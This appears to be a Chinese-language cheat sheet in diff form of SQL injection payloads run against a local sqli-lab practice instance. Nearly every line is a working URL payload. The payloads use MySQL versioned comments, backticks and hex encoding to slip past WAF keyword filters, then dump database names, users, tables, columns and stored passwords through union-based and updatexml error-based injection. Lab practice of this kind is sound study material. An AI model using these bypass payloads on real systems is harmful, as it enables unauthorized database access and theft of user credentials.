@@ -1,0 +1,26 @@
+1、order by 连用就会检测拦截
+http://192.168.244.137/sqli-lab/Less-1/?id=1' order/*!50000abc*/by 3 --+
+2、union后面接select会被检测拦截,database与（）连用也会拦截。
+中间使用两次注释符隔开字段
+http://192.168.244.137/sqli-lab/Less-1/?id=-1%27/*!60000abc*/union/*!60000abc*//*!60000abc*/select/*!60000abc*/1,database(/*!60000abc*/),3%20--+ 当前数据库
+http://192.168.244.137/sqli-lab/Less-1/?id=-1%27/*!60000abc*/union%20all/*!60000abc*//*!60000abc*/select/*!60000abc*/1,user(/*!60000abc*/),3%20--+ 当前用户
+http://192.168.244.137/sqli-lab/Less-1/?id=-1%27/*!60000abc*/union%20all/*!60000abc*//*!60000abc*/select/*!60000abc*/1,(select group_concat(SCHEMA_NAME) 
+from `information_schema`.SCHEMATA),3%20--+
+反引号注释爆库名
+3、http://192.168.244.137/sqli-lab/Less-1/?id=-1%27/*!60000abc*/union%20all/*!60000abc*//*!60000abc*/select/*!60000abc*/1,(select group_concat(table_name) 
+from `information_schema`.tables WHERE TABLE_SCHEMA=database(/*!60000abc*/)),3%20--+
+爆表名
+4、http://192.168.244.137/sqli-lab/Less-1/?id=-1%27/*!60000abc*/union%20all/*!60000abc*//*!60000abc*/select/*!60000abc*/1,(select group_concat(column_name) from `information_schema`.columns WHERE TABLE_NAME=0x7573657273),3%20--+
+爆列名
+5、http://192.168.244.137/sqli-lab/Less-1/?id=-1%27/*!60000abc*/union%20all/*!60000abc*//*!60000abc*/select/*!60000abc*/1,(select group_concat(password) from `users`),3%20--+
+读取列的内容
+6、http://192.168.244.137/sqli-lab/Less-1/?id=-1%27/*!60000abc*/union%20all/*!60000abc*//*!60000abc*/select/*!60000abc*/1,2,(select (password) from `users` limit 3,1)%20--+
+利用limit函数进行逐行读取数据，select后面可用函数hex、ws、char等绕过。
+7、http://192.168.244.137/sqli-lab/Less-1/?id=-1'AND updatexml/*!77777cz*/(1,version(),0) --+
+报错注入 将updatexml与()分开
+8、http://192.168.244.137/sqli-lab/Less-1/?id=1' and `updatexml`(1,concat(0x7e,(select USER/*!77777cz*/()),0x7e),1)-- +
+报错注入用户
+9、http://192.168.244.137/sqli-lab/Less-1/?id=1' and `updatexml`(1,concat(0x7e,(select database/*!77777cz*/()),0x7e),1)-- +
+报错注入当前数据库
+http://192.168.244.137/sqli-lab/Less-1/?id=1' and `updatexml`(1,concat(0x7e,(select unhex(hex(SCHEMA_NAME)) from `information_schema`.SCHEMATA limit 1,1),0x7e),1)-- +
+报错注入获取所有数据库
